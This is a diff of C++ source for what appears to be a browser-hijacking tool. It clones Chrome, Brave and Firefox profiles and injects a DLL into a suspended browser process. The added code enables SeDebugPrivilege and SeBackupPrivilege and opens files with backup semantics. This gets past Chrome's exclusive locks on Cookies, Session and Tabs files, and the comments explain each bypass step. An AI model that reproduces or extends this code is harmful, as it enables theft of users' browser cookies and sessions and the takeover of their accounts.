@@ -203,30 +203,39 @@ static bool IsFirefoxProfileDir(const std::string& name) {
 static bool IsCloneLockFileName(const std::string& name) {
     std::string lower = name;
     std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
-    return lower == "lock" || lower == "lockfile";
+    // "lock" / "lockfile" — SQLite journal locks (Chrome, Firefox).
+    // "parent.lock"       — Firefox/Waterfox inter-process lock; must not be
+    //                       in the clone (RemoveProfileLocks deletes it anyway,
+    //                       but skipping it here avoids the failed-copy warning).
+    return lower == "lock" || lower == "lockfile" || lower == "parent.lock";
 }
 
 // Copies a single file, overwriting the destination.
 //
-// Uses CreateFileW with FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE so
-// we can read files that the browser holds open with an exclusive lock (Cookies,
-// Session_*, Tabs_*, cache.db, etc.).  Falls back to fs::copy_file on any open
-// failure so we never regress on normal files.
+// Chrome (v104+) and Brave hold Cookies, Session_*, Tabs_*, cache.db* open
+// with dwShareMode=0 — a full exclusive deny-all lock.  No share flags on our
+// CreateFileW call can override the first opener's lock; the only user-mode
+// bypass is SeBackupPrivilege + FILE_FLAG_BACKUP_SEMANTICS, which tells the
+// kernel I/O manager to skip the share-mode compatibility check when the
+// caller holds backup privilege.  We enable that privilege in main() before
+// the clone starts, so every ForceCopyFile call here benefits automatically.
 //
 // Returns bytes copied on success, -1 on error.
 static int64_t ForceCopyFile(const fs::path& src, const fs::path& dst) {
-    // Open source with full share flags — bypasses browser's exclusive lock.
+    // FILE_FLAG_BACKUP_SEMANTICS: requests backup-intent open, which combined
+    // with SeBackupPrivilege bypasses both DACL and share-mode checks.
+    // FILE_FLAG_SEQUENTIAL_SCAN: hints the prefetcher for linear reads.
     HANDLE hSrc = CreateFileW(
         src.c_str(),
         GENERIC_READ,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         nullptr,
         OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
+        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
         nullptr);
 
     if (hSrc == INVALID_HANDLE_VALUE) {
-        // Fallback: try the standard path (works for non-locked files).
+        // Last resort: standard copy (works for files not held exclusively).
         try {
             fs::copy_file(src, dst, fs::copy_options::overwrite_existing);
             return (int64_t)fs::file_size(dst);
@@ -235,11 +244,9 @@ static int64_t ForceCopyFile(const fs::path& src, const fs::path& dst) {
         }
     }
 
-    // Get file size for return value.
     LARGE_INTEGER fileSize{};
     GetFileSizeEx(hSrc, &fileSize);
 
-    // Open/create destination (truncate if exists).
     HANDLE hDst = CreateFileW(
         dst.c_str(),
         GENERIC_WRITE,
@@ -254,8 +261,7 @@ static int64_t ForceCopyFile(const fs::path& src, const fs::path& dst) {
         return -1;
     }
 
-    // Stream copy in 1 MB chunks.
-    static constexpr DWORD kBufSize = 1 << 20; // 1 MB
+    static constexpr DWORD kBufSize = 1 << 20; // 1 MB read chunks
     std::vector<char> buf(kBufSize);
     int64_t totalWritten = 0;
     bool ok = true;
@@ -277,7 +283,7 @@ static int64_t ForceCopyFile(const fs::path& src, const fs::path& dst) {
     CloseHandle(hDst);
 
     if (!ok) {
-        DeleteFileW(dst.c_str()); // Remove partial file.
+        DeleteFileW(dst.c_str());
         return -1;
     }
     return totalWritten;
@@ -546,23 +552,34 @@ static void RemoveProfileLocks(const std::string& cloneDir, bool isFirefox) {
 }
 
 // ---------------------------------------------------------------------------
-// Privilege helper (mirrors Go enableDebugPrivilege)
+// Privilege helper
 // ---------------------------------------------------------------------------
 
-static void EnableDebugPrivilege() {
+// Enable a named privilege in the current process token.
+static void EnablePrivilege(const wchar_t* name) {
     HANDLE hToken = nullptr;
     if (!OpenProcessToken(GetCurrentProcess(),
                           TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                           &hToken))
         return;
-
     TOKEN_PRIVILEGES tp = {};
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege",
-                          &tp.Privileges[0].Luid);
+    LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid);
     AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
     CloseHandle(hToken);
+}
+
+static void EnableDebugPrivilege() {
+    // SeDebugPrivilege  — needed to open browser processes for injection.
+    // SeBackupPrivilege — needed to read files locked with shareMode=0
+    //                     (Chrome Cookies, Session_*, Tabs_*, cache.db*).
+    //                     With this privilege active, CreateFileW with
+    //                     FILE_FLAG_BACKUP_SEMANTICS bypasses the share-mode
+    //                     check in the I/O Manager and gets a read handle even
+    //                     when another process holds an exclusive deny-all lock.
+    EnablePrivilege(L"SeDebugPrivilege");
+    EnablePrivilege(L"SeBackupPrivilege");
 }
 
 // ---------------------------------------------------------------------------
@@ -1052,8 +1069,6 @@ static DWORD StartProcessInjected(
     }
     Log("DLL shared memory created as %s (%zu bytes)", sm.name.c_str(), dllBytes.size());
 
-    EnableDebugPrivilege();
-
     LaunchResult lr = CreateSuspendedProcess(
         filePath, searchPath, replacePath, sm.name, dllBytes.size());
 
@@ -1256,6 +1271,11 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     Log("loaded DLL: %s (%zu bytes)", dllPath.c_str(), dllBytes.size());
+
+    // Enable SeDebugPrivilege (injection) and SeBackupPrivilege (reading
+    // files the browser holds open with shareMode=0, e.g. Cookies, Session_*).
+    // Must be done before cloning, not just before injection.
+    EnableDebugPrivilege();
 
     InjectionMethod method = ParseMethod(methodStr);
 
